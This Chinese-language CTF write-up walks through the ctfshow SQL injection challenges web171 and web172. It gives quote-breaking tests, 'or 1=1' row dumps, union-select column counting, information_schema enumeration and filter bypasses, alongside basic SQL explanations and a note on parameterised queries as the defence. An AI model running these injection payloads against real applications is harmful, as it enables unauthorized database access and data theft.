---
title: "ctfshow-WEB入门（sql注入）"
description: "ctfshow-WEB入门（sql注入）"
image: "/assets/光下的西施.jpg"
date: 2026-11-25
updated: 2026-11-27
categories:
  - 学习
tags:
  - CTF
  - Web
  - 网络安全
  - SQL注入
type: tech
---

## ctfshow-WEB入门（sql注入）

### web171

![image-20261125202654278](/assets/ctfshow-web-sqli/image-20261125202654278.png)

页面上直接把后台拼接 SQL 的代码贴出来了：

```php
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

得到的信息：

- 看这个`$_GET['id']`就可以知道id 是 GET 传进来的，外面套了一层单引号，典型的==字符型注入==
- select 只查了 username 和 password 两列，查出来的东西会显示在页面上
- 条件里写了 `username != 'flag'`，说明出题人特意把 flag 那行藏了起来，但查询语句本身没拦着我们动 id

#### 一些概念与解释

##### Q1：页面上的数据是怎么来的？

先查 id=1，表格里出现 admin / admin。

![image-20261125204752147](/assets/ctfshow-web-sqli/image-20261125204752147.png)

不过这个数据不是后端直接写在页面里的。打开页面源码能看到，表格只是个空壳：

```html
<table id="user" lay-filter="user-filter"></table>
```

![image-20261125204846679](/assets/ctfshow-web-sqli/image-20261125204846679.png)

真正的渲染逻辑在 `js/select.js` 里，用的是 layui 的 table 组件：

```javascript
table.render({
  elem: '#user',
  page: true,        // 开启分页
  url: "api/",       // 数据源
  cols: [[{field:'id'}, {field:'username'}, {field:'password'}]]
});

// 点“查询”时
form.on('submit(*)', function(data){
  table.reload('user_table', { url: 'api/?id=' + data.field['id'] });
  return false;   // 阻止表单提交，页面不刷新
});
```

意思就是：页面只加载一次，之后点“查询”，浏览器在后台单独发一个请求到 `api/`，把输入框里的 id 拼在地址后面，服务器把数据返回给 JS，JS 再填进表格。

整个过程大概这样：

```
打开页面        → 服务器返回 HTML + JS（里面没有数据）
layui 自动请求   → api/?page=1&limit=10
点击查询        → api/?id=1&page=1&limit=10
服务器          → 读 id、拼 SQL、查 MySQL
返回            → JSON
JS 渲染         → 把 JSON 里的 data 填成表格
```

`page=1&limit=10` 也不是我们手写的，是 layui 开了分页后自动带上的分页参数。

服务器返回的 JSON 长这样：

```json
{
  "code": 0,
  "msg": "查询成功",
  "count": 1,
  "data": [{"id":"1","username":"admin","password":"admin"}]
}
```

`code` 是状态，`msg` 是提示，`count` 是总条数，`data` 是当前页的数据。JS 拿到 `data` 后循环生成表格行，就是屏幕上看到的效果。

所以后面抓包或者用工具打的时候，直接请求 `api/?id=...&page=1&limit=10` 就行，返回的是纯 JSON，不用去解析网页。

##### Q2：什么是 layui ？

layui 是一个前端的 UI 组件库，可以理解成网页界面的“现成零件套装”。和 Bootstrap、Element UI、Ant Design 属于同一类东西，在国内的后台系统里特别常见。

它的特点是：

- 一套 CSS + 一堆 JS 组件，引进来就能用
- 常用组件都有现成的：表格、表单、弹窗、导航栏、进度条、上传、分页
- 每个组件用 `layui.use('xxx', function(){...})` 加载，像搭积木
- 2.x 版本底层依赖 jQuery

查看这个靶场的源代码就能够认出是 layui，定位这些关键词，看这些内容就知道了：

```html
<ul class="layui-nav"> ... </ul>                    <!-- 顶部导航 -->
<div class="layui-form"> ... </div>                 <!-- 表单 -->
<table id="user" lay-filter="user-filter"></table>  <!-- 表格 -->
<div class="layui-progress-bar" lay-percent="1/150"></div> <!-- 进度条 -->
```

```javascript
layui.use('table', function(){
  var table = layui.table;
  table.render({ ... });                          // 渲染表格
});

layui.use('form', function(){
  var form = layui.form;
  form.on('submit(*)', function(data){ ... });    // 拦截表单提交
});
```

对这题最关键的是它的 table 组件。它不只是画个表格，还自带这些功能：

- **自动发请求**：给了 `url: "api/"`，它就自己用 Ajax 去拿数据
- **自动分页**：开了 `page: true`，请求里会自动加 `page=1&limit=10`
- **约定返回格式**：只认 `{code, count, data}` 这种 JSON，`code: 0` 表示成功
- **自动渲染**：拿到 `data` 数组后循环生成表格行，不用手写 `<tr><td>`
- **局部刷新**：`table.reload()` 换数据源，页面不跳转

所以这个靶场里“点查询表格变了但页面没刷新”“请求自动带 page/limit”“返回 json 就能显示成表格”，都是 layui 在背后做的。

对做题来说，看到 `layui-*` 的 class 或 `layui.use`，基本就能判断数据是 Ajax + JSON，可以直接抓接口打，不用管页面长什么样。

简单来说：layui 是给网页“化妆 + 装动作”的前端工具包，和 SQL 注入本身没关系，但它决定了数据以什么方式进出浏览器。

##### Q3：SQL 和 MySQL 基础

打注入之前，先补几个最基本的点。

**数据库长什么样**

一个数据库里有若干张表，表里是行和列。用 Excel 类比：库 = 工作簿，表 = sheet，列 = 表头，行 = 一条记录。

**SQL 是干什么的**

SQL 是操作数据库的语言，常用语句分几类：

| 分类 | 作用 | 关键字 |
|---|---|---|
| DDL | 建库建表改结构 | CREATE / ALTER / DROP |
| DML | 增删改数据 | INSERT / UPDATE / DELETE |
| DQL | 查询 | SELECT |
| DCL | 权限 | GRANT / REVOKE |

注入题里基本都是和 SELECT 打交道：

```sql
SELECT 列1,列2 FROM 表 WHERE 条件 ORDER BY 列 LIMIT 偏移,条数;
```

**一些规则：**

- and 的优先级比 or 高，所以 `a and b or c` 等于 `(a and b) or c`
- union 用来把两条查询结果拼在一起，要求两边列数一样
- order by 后面跟数字，表示按第几列排序，注入里常用来数有几列
- limit 控制返回几条

**MySQL 的注释**

- `#` 注释到行尾（MySQL 特有）
- `-- ` 后面必须有个空格才算注释，URL 里一般写成 `--+`
- `/* */` 块注释（`/*! */` 里的内容仍会执行，常用来绕 WAF）

注入时注释符的作用是把后半句 SQL 截掉。

**information_schema**

MySQL 5.0 以后自带一个系统库 information_schema，里面存着所有库名、表名、列名，相当于数据库的“目录”：

- SCHEMATA：所有库名
- TABLES：所有表名
- COLUMNS：所有列名

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='表名';
```

所以注入拿到库名之后，靠它就能一路把表名、列名翻出来。

**注入大概分几种**

| 类型 | 什么时候用 |
|---|---|
| union 联合注入 | 页面有回显位 |
| 报错注入 | 页面会把数据库报错显示出来 |
| 布尔盲注 | 页面没数据，但真/假两种状态有区别 |
| 时间盲注 | 页面完全没区别，只能靠 sleep 延迟判断 |
| 堆叠注入 | 能一次执行多条语句 |

**怎么防**

根本办法是预编译/参数化查询：SQL 语句写死，用户输入只当参数，不拼字符串；表名、列名这类没法参数化的用白名单。判断一段代码能不能注入，最快的标准就是看它有没有把用户输入拼进 SQL。

#### 题解

##### 先看看能不能进行注入

传一个单引号试试：

```sql
id=1'
```

页面返回异常，说明引号是能被闭合的。再对比 `1' and 1=1--+` 和 `1' and 1=2--+`，一个正常一个报错，那么基本上就是==字符型注入==了。

![image-20261125203312718](/assets/ctfshow-web-sqli/image-20261125203312718.png)



![image-20261127210337486](/assets/ctfshow-web-sqli/image-20261127210337486.png)

![image-20261127210354180](/assets/ctfshow-web-sqli/image-20261127210354180.png)

###### 运行原理：

把四个输入放在一起对比，就能看懂“闭合”是什么意思。

原始 SQL 大概是这样拼接的（真实表是 `ctfshow_user`，3 列）：

```sql
select id,username,password from ctfshow_user
where username != 'flag' and id = '【输入】' limit 1;
```

**1. 正常输入 `1`**

```sql
... and id = '1' limit 1;
```

`'1'` 是完整的字符串，语法正常，返回 admin。

**2. 输入 `1'`**

```sql
... and id = '1'' limit 1;
```

输入里的单引号把原本包着值的字符串提前关掉了，后面原句里的 `'` 又变成了一个新字符串的开头，一直到结尾都没闭合。MySQL 解析到一半发现引号不配对，直接语法错误，后端没有返回正常 JSON，所以接口是空响应。

这个“异常”说明输入的引号被当成 SQL 语法处理了，而不是当成普通字符，这就是“能闭合”。

**3. 输入 `1' and 1=1--+`**

```sql
... and id = '1' and 1=1-- ' limit 1;
```

`-- ` 是注释，把后面多余的 `' limit 1;` 全部注释掉，真正执行的是：

```sql
... and id = '1' and 1=1
```

`1=1` 恒真，整体条件成立，正常返回 admin。

**4. 输入 `1' and 1=2--+`**

```sql
... and id = '1' and 1=2-- ' limit 1;
```

注释后执行：

```sql
... and id = '1' and 1=2
```

`1=2` 恒假，查不到数据。但 SQL 语法是合法的，所以不报错，只是返回空列表。

- 单引号让查询报错：说明输入能破坏 SQL 语法，存在注入点
- `and 1=1` 有数据、`and 1=2` 没数据：说明后面的条件真的被数据库执行了，注入确认
- 顺便还能用 `1'--+` 只闭合、不改条件，返回和 `1` 一样，说明注释符能把后面多余的 SQL 截掉

##### 把藏起来的 flag 捞出来

后台条件是 `username != 'flag' and id = '...'`。and 的优先级比 or 高，所以只要让 and 前面那半截为假，再用 or 接一个恒真的条件，整张表就都出来了。

```sql
id=-1' or 1=1--+
```

![image-20261127211931937](/assets/ctfshow-web-sqli/image-20261127211931937.png)

`id=-1` 在表里不存在，前半段直接假掉，`or 1=1` 让条件恒真。接口支持 limit 参数，默认只回一条，把 limit 调大就能看到所有用户，flag 就躺在 username=flag 那一行。

如果只想精准拿 flag，不用全表：

```sql
id=-1' or username='flag'--+
```

![image-20261127212002214](/assets/ctfshow-web-sqli/image-20261127212002214.png)

### web172

这道题目有只可爱的小猫咪
![image-20261127212622291](/assets/ctfshow-web-sqli/image-20261127212622291.png)

#### 信息收集

打开首页，导航栏的 SELECT 模块下面只有两个展开项：

```html
<dd><a href="select-no-waf-1.php">无过滤注入1</a></dd>
<dd><a href="select-no-waf-2.php">无过滤注入2</a></dd>
```

![image-20261127223044332](/assets/ctfshow-web-sqli/image-20261127223044332.png)

其它模块都写着“暂未开放”，所以能查询的页面就这两个。

##### 可以对比两个界面的信息

`过滤注入2`已经写有flag了，那么应该就是在这个界面进行sql注入

![image-20261127223158261](/assets/ctfshow-web-sqli/image-20261127223158261.png)

![image-20261127223150120](/assets/ctfshow-web-sqli/image-20261127223150120.png)

#### 漏洞探测

```
1'
```

![image-20261127220422333](/assets/ctfshow-web-sqli/image-20261127220422333.png)

空响应说明语法被破坏

```
1' and 1=1--+           -> 正常返回 admin
1' and 1=2--+           -> 合法 SQL，但 data 为空
1' order by 1--+        -> 正常
1' order by 2--+        -> 正常
1' order by 3--+        -> 报错/空  => 只有 2 列
```

![image-20261127220623672](/assets/ctfshow-web-sqli/image-20261127220623672.png)



![image-20261127220638084](/assets/ctfshow-web-sqli/image-20261127220638084.png)

![image-20261127220652245](/assets/ctfshow-web-sqli/image-20261127220652245.png)

![image-20261127220712974](/assets/ctfshow-web-sqli/image-20261127220712974.png)

![image-20261127220729011](/assets/ctfshow-web-sqli/image-20261127220729011.png)

#### 漏洞验证与利用，union 拿数据

先试最小的 union：

```sql
100' union select 1,2--+
```

或者使用下面这个也可以

```
-1' union select 1,2--+
```

拼接后实际执行的是：

```sql
select username,password from ctfshow_user2
where username != 'flag' and id = '100'
union select 1,2
```

`-- ` 把后面的 `' limit 1;` 注释掉。前半句 `id='100'` 查不到东西，后半句 `select 1,2` 直接造一行数据，拼起来就只剩我们这一行：

```json
{"username":"1","password":"2"}
```

这一步说明了三件事情：

- 列数是 2（多一列少一列都会报错）
- 两个位置都有回显
- union被执行了（数据库里根本没有 `(1,2)` 这行数据）

注意，不能用1，我们的目标是是让前半句查空：

| 输入 | 返回 |
|---|---|
| `1' union select 1,2--+` | admin 和 (1,2)，共 2 行 |
| `-1' union select 1,2--+` | 只有 (1,2) |
| `100' union select 1,2--+` | 只有 (1,2) |

`-1` 和 `100` 效果一样，都是表里不存在的 id；用 `1` 会把 admin 也带出来，结果不干净。另外如果 `limit 1` 没被注释掉，也只有前半句查空时，union 的行才留得下来。

![image-20261127220845621](/assets/ctfshow-web-sqli/image-20261127220845621.png)

#### 拿到库名、表名、列名

```sql
-1' union select 1,database()--+
```

![image-20261127224503011](/assets/ctfshow-web-sqli/image-20261127224503011.png)

```
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+
```

![image-20261127224517864](/assets/ctfshow-web-sqli/image-20261127224517864.png)

```
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user2'--+
```

![image-20261127224529945](/assets/ctfshow-web-sqli/image-20261127224529945.png)

这里用 `group_concat()` 是为了避开接口的去重：如果写成 `union select 1,table_name`，两行结果的 username 都是 `1`，会被按第一列去重合并成一行，只看得到一个表名。把多个名字拼进 password 这一列（`group_concat`），或者把 `table_name` 放到第一列，就能完整显示。

#### 拖全表，为什么只看到 4 行

```sql
-1' union select username,password from ctfshow_user2--+
```

![image-20261127224549820](/assets/ctfshow-web-sqli/image-20261127224549820.png)

拼接后：

```sql
select username,password from ctfshow_user2 where username != 'flag' and id = '-1'
union select username,password from ctfshow_user2
```

前半句查空，后半句把整张表拖出来。但实际只返回了 4 行（admin、user1、user2、userAUTO），不是 25 行。

**原因有两个：**

1. 表里有 25 行（`count(*)` 实测），但接口对结果**按第一列 username 去重**，同名只留一条。
2. username 为 flag 的那一行被返回逻辑过滤掉了。

验证去重很简单，把第一列换成唯一的值，就能看到全部 25 行。

把第一列换成 id：

```sql
-1' union select id,password from ctfshow_user2--+
```

返回 25 行，第一列是 1、2、3……26，每行都不同，去重失效；而且 flag 行的 username 变成了 `26`，连检查都绕过了，密码直接是 flag：

![image-20261127230141402](/assets/ctfshow-web-sqli/image-20261127230141402.png)

或者把 username 和 id 拼起来：

```sql
-1' union select concat(username,id),password from ctfshow_user2--+
```

![image-20261127230246847](/assets/ctfshow-web-sqli/image-20261127230246847.png)

第一列变成 `admin1`、`user12`、`flag26`…… 每行都唯一，同样 25 行；flag 行的 username 是 `flag26`，不等于 `flag`，也出来了。

这两个写法的本质一样：**去重是按第一列的值做的，只要让第一列每行都不一样，就能看到全部数据。**

#### 返回逻辑：过滤的是结果，不是输入

页面给的代码：

```php
if($row->username !== 'flag'){
  $ret['msg']='查询成功';
}
```

- `$row` 是查出来的当前行
- `$row->username` 是这一行的 username 值
- `!==` 是严格不等于（值和类型都不同）
- 整句意思：username 不是字符串 `'flag'` 才提示查询成功；是的话这一行就被拦掉

**它检查的是“查出来的结果”，不是“输入的 payload”。**

完整的数据流是这样：

```
你输入的 id
  → PHP 拼成 SQL（这里没做任何过滤）
  → MySQL 执行，返回若干行
  → PHP 检查每一行的 $row->username
  → 不等于 flag 就放进结果，等于 flag 就丢掉
  → 转成 JSON 给前端
```

检查点只有一个：PHP 拿到结果行之后，看这一行的 username 列。你输入里有没有 `flag`，它根本不看。

比如这条 payload 里写着 `username='flag'`：

```sql
-1' union select 1,password from ctfshow_user2 where username='flag'--+
```

![image-20261127230351059](/assets/ctfshow-web-sqli/image-20261127230351059.png)

如果后端做的是“输入过滤”，它大可以把这条请求拦掉。但它没拦，而是让 SQL 正常执行，最后看结果行是 `(1, 密文)`，`$row->username` 是 `1`，`1 !== 'flag'`，通过。flag 两个字只出现在 WHERE 条件里，没出现在返回行的 username 列里。

#### 两种绕过

思路一：username 位置填个常量，password 位置取 flag

```sql
-1' union select 1,password from ctfshow_user2 where username='flag'--+
```

![image-20261127224849952](/assets/ctfshow-web-sqli/image-20261127224849952.png)

思路二：利用 `!==` 区分大小写

```sql
-1' union select UPPER(username),password from ctfshow_user2 where username='flag'--+
```

![image-20261127224910090](/assets/ctfshow-web-sqli/image-20261127224910090.png)

`FLAG !== flag`，检查同样通过。
